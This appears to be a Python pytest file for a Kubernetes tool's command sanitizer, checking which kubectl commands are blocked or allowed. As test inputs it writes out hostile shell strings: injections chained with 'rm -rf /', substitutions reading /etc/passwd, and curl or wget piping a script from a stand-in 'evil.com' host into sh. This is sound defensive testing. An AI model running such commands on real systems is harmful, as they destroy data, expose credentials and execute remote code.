"""
Security Tests - Command Sanitization
"""

import pytest
from opensre_core.security.sanitize import (
    sanitize_command,
    sanitize_command_full,
    sanitize_input,
    sanitize_namespace,
    escape_for_shell,
)


class TestSanitizeCommand:
    """Tests for command sanitization."""
    
    def test_blocks_command_injection_semicolon(self):
        """Block commands chained with semicolon."""
        assert sanitize_command("kubectl get pods; rm -rf /")[0] == False
        assert sanitize_command("kubectl get pods ; rm -rf /")[0] == False
        assert sanitize_command("kubectl get pods;rm -rf /")[0] == False
    
    def test_blocks_command_injection_pipe(self):
        """Block commands piped to dangerous operations."""
        assert sanitize_command("kubectl get pods | rm -rf /")[0] == False
        assert sanitize_command("kubectl get pods |rm -rf /")[0] == False
    
    def test_blocks_command_injection_and(self):
        """Block commands chained with &&."""
        assert sanitize_command("kubectl get pods && rm -rf /")[0] == False
        assert sanitize_command("kubectl get pods&&rm -rf /")[0] == False
    
    def test_blocks_command_injection_or(self):
        """Block commands chained with ||."""
        assert sanitize_command("kubectl get pods || rm -rf /")[0] == False
    
    def test_blocks_shell_expansion_dollar(self):
        """Block $() command substitution."""
        assert sanitize_command("kubectl get pods $(whoami)")[0] == False
        assert sanitize_command("kubectl get pods $( cat /etc/passwd )")[0] == False
    
    def test_blocks_shell_expansion_backtick(self):
        """Block backtick command substitution."""
        assert sanitize_command("kubectl get pods `whoami`")[0] == False
        assert sanitize_command("kubectl get `id` pods")[0] == False
    
    def test_blocks_variable_expansion(self):
        """Block ${} variable expansion."""
        assert sanitize_command("kubectl get pods ${HOME}")[0] == False
    
    def test_blocks_curl_shell_pipe(self):
        """Block curl piped to shell."""
        assert sanitize_command("curl http://evil.com/script.sh | sh")[0] == False
        assert sanitize_command("curl http://evil.com/script.sh | bash")[0] == False
        assert sanitize_command("wget http://evil.com/script.sh | sh")[0] == False
    
    def test_blocks_redirect_to_root(self):
        """Block redirects to root filesystem."""
        assert sanitize_command("kubectl get pods > /etc/passwd")[0] == False
        assert sanitize_command("kubectl get pods >> /etc/passwd")[0] == False
    
    def test_blocks_non_kubectl_commands(self):
        """Block non-kubectl commands."""
        assert sanitize_command("ls -la")[0] == False
        assert sanitize_command("cat /etc/passwd")[0] == False
        assert sanitize_command("rm -rf /")[0] == False
        assert sanitize_command("curl http://example.com")[0] == False
    
    def test_blocks_unknown_kubectl_verbs(self):
        """Block unknown kubectl verbs."""
        assert sanitize_command("kubectl hack pods")[0] == False
        assert sanitize_command("kubectl pwn system")[0] == False
    
    def test_blocks_delete_all(self):
        """Block kubectl delete --all."""
        assert sanitize_command("kubectl delete pods --all")[0] == False
        assert sanitize_command("kubectl delete pods --all -n default")[0] == False
    
    def test_blocks_namespace_deletion(self):
        """Block namespace deletion."""
        assert sanitize_command("kubectl delete namespace production")[0] == False
        assert sanitize_command("kubectl delete ns production")[0] == False
    
    def test_allows_safe_commands(self):
        """Allow safe kubectl commands."""
        assert sanitize_command("kubectl get pods")[0] == True
        assert sanitize_command("kubectl get pods -n default")[0] == True
        assert sanitize_command("kubectl describe pod my-pod")[0] == True
        assert sanitize_command("kubectl logs my-pod --tail=100")[0] == True
        assert sanitize_command("kubectl top pods")[0] == True
        assert sanitize_command("kubectl get events --sort-by=.lastTimestamp")[0] == True
    
    def test_allows_medium_risk_commands(self):
        """Allow medium-risk commands (they pass sanitization but need approval)."""
        assert sanitize_command("kubectl scale deployment my-app --replicas=3")[0] == True
        assert sanitize_command("kubectl rollout restart deployment my-app")[0] == True
        assert sanitize_command("kubectl cordon my-node")[0] == True
        assert sanitize_command("kubectl uncordon my-node")[0] == True
    
    def test_allows_high_risk_commands(self):
        """Allow high-risk commands (they pass sanitization but need approval)."""
        assert sanitize_command("kubectl delete pod my-pod")[0] == True
        assert sanitize_command("kubectl apply -f config.yaml")[0] == True
        assert sanitize_command("kubectl patch deployment my-app -p '{\"spec\":{}}'")[0] == True
    
    def test_risk_level_classification(self):
        """Test risk level is correctly classified."""
        result = sanitize_command_full("kubectl get pods")
        assert result.risk_level == "low"
        
        result = sanitize_command_full("kubectl scale deployment x --replicas=2")
        assert result.risk_level == "medium"
        
        result = sanitize_command_full("kubectl delete pod my-pod")
        assert result.risk_level == "high"
    
    def test_empty_command(self):
        """Block empty commands."""
        assert sanitize_command("")[0] == False
        assert sanitize_command("   ")[0] == False


class TestSanitizeInput:
    """Tests for input sanitization."""
    
    def test_removes_null_bytes(self):
        """Remove null bytes from input."""
        assert "\x00" not in sanitize_input("hello\x00world")
        assert sanitize_input("hello\x00world") == "helloworld"
    
    def test_removes_control_characters(self):
        """Remove control characters from input."""
        assert sanitize_input("hello\x07world") == "helloworld"
        assert sanitize_input("hello\x1bworld") == "helloworld"
    
    def test_preserves_newlines_and_tabs(self):
        """Preserve newlines and tabs."""
        assert sanitize_input("hello\nworld") == "hello\nworld"
        assert sanitize_input("hello\tworld") == "hello\tworld"
    
    def test_truncates_long_input(self):
        """Truncate input to max length."""
        long_input = "a" * 2000
        assert len(sanitize_input(long_input)) == 1000
        assert len(sanitize_input(long_input, max_length=500)) == 500
    
    def test_strips_whitespace(self):
        """Strip leading/trailing whitespace."""
        assert sanitize_input("  hello  ") == "hello"
        assert sanitize_input("\n\nhello\n\n") == "hello"


class TestSanitizeNamespace:
    """Tests for namespace validation."""
    
    def test_valid_namespaces(self):
        """Accept valid namespaces."""
        assert sanitize_namespace("default")[0] == True
        assert sanitize_namespace("production")[0] == True
        assert sanitize_namespace("my-namespace")[0] == True
        assert sanitize_namespace("ns123")[0] == True
        assert sanitize_namespace("a")[0] == True
    
    def test_invalid_namespaces(self):
        """Reject invalid namespaces."""
        assert sanitize_namespace("")[0] == False
        assert sanitize_namespace("-invalid")[0] == False
        assert sanitize_namespace("invalid-")[0] == False
        assert sanitize_namespace("UPPERCASE")[0] == False
        assert sanitize_namespace("has_underscore")[0] == False
        assert sanitize_namespace("has.dot")[0] == False
    
    def test_namespace_length(self):
        """Reject namespaces over 63 characters."""
        long_namespace = "a" * 64
        assert sanitize_namespace(long_namespace)[0] == False
        
        valid_long = "a" * 63
        assert sanitize_namespace(valid_long)[0] == True


class TestEscapeForShell:
    """Tests for shell escaping."""
    
    def test_escapes_special_characters(self):
        """Escape special shell characters."""
        assert escape_for_shell("hello world") == "'hello world'"
        assert escape_for_shell("test;rm -rf") == "'test;rm -rf'"
        assert escape_for_shell("$(whoami)") == "'$(whoami)'"
    
    def test_escapes_quotes(self):
        """Escape quotes in input."""
        result = escape_for_shell("it's a test")
        # shlex.quote handles single quotes by breaking out of quotes
        assert "'" in result
